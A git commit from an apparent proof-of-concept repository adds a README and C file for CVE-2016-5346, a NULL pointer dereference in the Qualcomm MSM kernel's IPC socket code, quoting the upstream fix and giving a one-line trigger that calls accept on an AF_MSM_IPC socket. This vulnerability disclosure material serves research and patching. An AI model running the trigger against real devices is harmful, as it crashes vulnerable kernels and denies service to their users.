ele7enxxh__poc-exp
commit 2b01683a283f3fd6d1013f10770bd40d0d5cd224
Author:     ele7enxxh <ele7enxxh@qq.com>
AuthorDate: Wed Jan 25 10:17:25 2017 +0800
Commit:     ele7enxxh <ele7enxxh@qq.com>
CommitDate: Wed Jan 25 10:17:25 2017 +0800

    poc for CVE-2016-5346

diff --git a/CVE-2016-5346/README.md b/CVE-2016-5346/README.md
new file mode 100644
index 0000000..fe1bbd2
--- /dev/null
+++ b/CVE-2016-5346/README.md
@@ -0,0 +1,45 @@
+## Description
+
+NULL pointer dereference when processing accept system call by user process on AF_MSM_IPC sockets.  
+
+The patch is as follows:
+https://source.codeaurora.org/quic/la//kernel/msm-3.18/commit/?id=71fe5361cbef34e2d606b79e8936a910a3e95566
+```
+diff --git a/net/ipc_router/ipc_router_socket.c b/net/ipc_router/ipc_router_socket.c
+index 828797b..652531a 100644
+--- a/net/ipc_router/ipc_router_socket.c
++++ b/net/ipc_router/ipc_router_socket.c
+@@ -555,10 +555,18 @@ static unsigned int msm_ipc_router_poll(struct file *file,
+ static int msm_ipc_router_close(struct socket *sock)
+ {
+ 	struct sock *sk = sock->sk;
+-	struct msm_ipc_port *port_ptr = msm_ipc_sk_port(sk);
++	struct msm_ipc_port *port_ptr;
+ 	int ret;
+ 
++	if (!sk)
++		return -EINVAL;
++
+ 	lock_sock(sk);
++	port_ptr = msm_ipc_sk_port(sk);
++	if (!port_ptr) {
++		release_sock(sk);
++		return -EINVAL;
++	}
+ 	ret = msm_ipc_router_close_port(port_ptr);
+ 	msm_ipc_unload_default_node(msm_ipc_sk(sk)->default_node_vote_info);
+ 	release_sock(sk);
+```
+
+## Poc
+
+```C
+#include <sys/socket.h>
+
+#define AF_MSM_IPC 27
+
+void main()
+{
+	accept(socket(AF_MSM_IPC, SOCK_DGRAM, 0), 0, 0);
+}
+```
\ No newline at end of file
diff --git a/CVE-2016-5346/cve-2016-5346.c b/CVE-2016-5346/cve-2016-5346.c
new file mode 100644
index 0000000..8489227
--- /dev/null
+++ b/CVE-2016-5346/cve-2016-5346.c
@@ -0,0 +1,8 @@
+#include <sys/socket.h>
+
+#define AF_MSM_IPC 27
+
+void main()
+{
+	accept(socket(AF_MSM_IPC, SOCK_DGRAM, 0), 0, 0);
+}
\ No newline at end of file
